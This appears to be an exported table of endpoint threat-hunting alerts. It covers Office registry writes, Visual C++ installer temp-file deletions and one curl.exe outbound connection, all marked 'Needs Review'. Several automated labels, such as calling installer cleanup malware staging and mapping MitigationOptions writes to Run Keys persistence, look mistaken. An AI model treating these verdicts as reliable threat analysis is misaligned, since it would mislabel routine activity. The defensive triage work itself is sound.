Timestamp,Process,Parent Process,Command Line,Detection Type,Risk Score,Investigation Reason,Source IP,Destination IP,Registry Path,File Path,DNS Query,Event Action,PID,MITRE Technique,MITRE Name,Allowlisted,Severity,Confidence,FP Assessment,Analyst Verdict,Recommendation,Alert ID
"Jun 1, 2026 @ 14:21:17.110",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\sdxhelper.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sdxhelper.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-0566DC90
"Jun 1, 2026 @ 14:21:16.667",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\winword.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winword.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-AD6296C9
"Jun 1, 2026 @ 14:21:18.136",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\mspub.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspub.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-36DD556C
"Jun 1, 2026 @ 14:21:45.815",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1041\thm.wxl,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-C11EF935
"Jun 1, 2026 @ 14:21:45.819",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1046\thm.wxl,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-0596CDBF
"Jun 1, 2026 @ 14:21:45.817",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1045\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-24CF2062
"Jun 1, 2026 @ 14:21:47.388",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1036\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-2B7DFBEC
"Jun 1, 2026 @ 14:21:47.389",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1040\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-20E2FE36
"Jun 1, 2026 @ 14:21:47.386",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1029\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-0700ED2A
"Jun 1, 2026 @ 14:21:47.387",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1031\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-F8BDE282
"Jun 1, 2026 @ 14:21:47.390",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1041\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-6CC0A5CE
"Jun 1, 2026 @ 14:21:47.391",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1042\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-66CA8ABB
"Jun 1, 2026 @ 14:21:47.394",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1055\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-2EAD3033
"Jun 1, 2026 @ 14:21:47.393",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1046\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-A5EB4B42
"Jun 1, 2026 @ 14:21:47.399",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-F12DDEB9
"Jun 1, 2026 @ 14:21:47.396",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\3082\thm.wxl,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-279BC4E9
"Jun 1, 2026 @ 14:21:47.398",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-41104B4B
"Jun 1, 2026 @ 14:21:45.823",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\2052\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-7EBE900E
"Jun 1, 2026 @ 14:21:45.824",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\3082\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-742A988F
"Jun 1, 2026 @ 14:21:45.826",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-68C29731
"Jun 1, 2026 @ 14:21:47.384",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1028\license.rtf,,deletion,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-135F40A2
"Jun 1, 2026 @ 14:21:47.049",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IntranetName,,,modification,"34,308",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-09160C62
"Jun 1, 2026 @ 14:23:19.842",C:\Windows\System32\curl.exe,,,External Communication | LOLBin Abuse,40,Living-off-the-land binary: curl.exe ; Outbound to external IP: 34.117.59.81,173.10.254.170,34.117.59.81,,,,connection_attempted,"21,052",T1016,System Network Config Discovery,False,MEDIUM,MEDIUM,Needs Review,Review,Block destination IP at perimeter; review netflow,AH-EAAA5B63
"Jun 1, 2026 @ 14:21:45.808",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1028\thm.wxl,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-87889E29
"Jun 1, 2026 @ 14:21:45.810",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1031\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-821FA96A
"Jun 1, 2026 @ 14:21:45.813",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1040\license.rtf,,deletion,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-F087C657
"Jun 1, 2026 @ 14:21:45.059",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-4D6C1652
"Jun 1, 2026 @ 14:21:18.729",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msaccess.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msaccess.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-DE789664
"Jun 1, 2026 @ 14:21:18.666",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\excel.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\excel.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-35E24B82
"Jun 1, 2026 @ 14:21:18.607",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\lync.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lync.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-6AAB2EF1
